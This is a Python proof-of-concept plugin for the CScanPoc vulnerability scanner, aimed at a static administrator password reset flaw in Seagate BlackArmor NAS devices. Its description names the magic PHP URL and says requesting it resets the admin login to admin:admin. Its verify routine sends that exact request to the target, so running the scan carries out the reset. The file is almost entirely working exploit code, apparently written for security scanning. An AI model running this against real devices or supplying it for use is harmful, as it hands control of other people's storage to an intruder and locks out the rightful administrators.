# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse

class Vuln(ABVuln):
    poc_id = '2212a316-875d-465d-b5b9-54a0792e073d'
    name = '希捷NAS 管理员密码重置'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2012-05-23'  # 漏洞公布时间
    desc = '''
        The Seagate BlackArmor network attached storage device contains a static administrator password reset vulnerability.
        访问 http://foobar/d41d8cd98f00b204e9800998ecf8427e.php 管理员密码将被重置为admin:admin
    '''  # 漏洞描述
    ref = 'https://www.kb.cert.org/vuls/id/515283'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '希捷NAS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5dffc5a3-1fb1-4bc1-965c-8ecfc6177642'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/d41d8cd98f00b204e9800998ecf8427e.php'
            verify_url = self.target + payload
            r = requests.get(verify_url)
        
            if r.status_code == 200 and '<h1><strong>OK!</strong></h1>' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
